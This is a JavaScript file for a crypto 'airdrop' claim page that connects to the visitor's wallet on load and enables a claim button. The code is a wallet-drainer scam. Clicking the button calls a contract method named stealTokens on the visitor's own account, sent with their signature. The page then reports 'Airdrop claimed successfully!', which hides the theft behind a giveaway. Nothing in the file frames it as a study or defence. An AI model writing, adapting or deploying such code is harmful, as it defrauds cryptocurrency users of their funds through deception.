// Ensure that accounts is properly initialized
let accounts = [];

async function claimAirdrop() {
    if (accounts.length === 0) {
        alert('Please connect to a wallet first!');
        return;
    }

    if (!contractABI || !contractAddress) {
        alert('Contract details not loaded. Please try again later.');
        return;
    }

    const contract = new web3.eth.Contract(contractABI, contractAddress);
    try {
        console.log('Claiming airdrop...');
        // Ensure that accounts are being accessed correctly
        await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
        alert('Airdrop claimed successfully!');
    } catch (error) {
        alert('Error claiming airdrop');
        console.error('Claim error:', error);
    }
}

// Ensure that accounts are fetched properly on page load
window.addEventListener('DOMContentLoaded', (event) => {
    if (web3 && window.ethereum) {
        window.ethereum.request({ method: 'eth_requestAccounts' })
            .then((userAccounts) => {
                accounts = userAccounts; // Set accounts here
                console.log('Accounts:', accounts);
                document.getElementById('claimAirdropButton').disabled = false; // Enable the claim button
                document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
            })
            .catch((error) => {
                console.error('Failed to get accounts:', error);
            });
    }
});

